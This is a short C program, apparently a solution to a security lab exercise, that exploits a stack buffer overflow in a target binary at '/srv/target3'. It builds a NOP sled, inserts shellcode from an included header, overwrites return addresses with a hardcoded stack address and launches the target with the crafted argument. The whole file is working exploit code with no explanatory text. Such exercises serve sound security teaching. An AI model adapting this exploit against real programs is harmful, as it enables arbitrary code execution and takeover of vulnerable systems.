#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/srv/target3"

int main(void)
{
  char *args[3];
  char *env[1];

  char buf[256];
  int32_t *intvec = (int32_t*)buf;

  memset(buf, 0x90, 256);
  memcpy(buf+32, shellcode, sizeof(shellcode)); 

  intvec[16] = 0xffffcf88;
  intvec[17] = 0xffffcf88;
  intvec[18] = 0xffffcf88;
  intvec[19] = 0xffffcf88;
  intvec[20] = 0xffffcf88;

  args[0] = TARGET;
  args[1] = buf; 
  args[2] = NULL;

  env[0] = NULL;

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}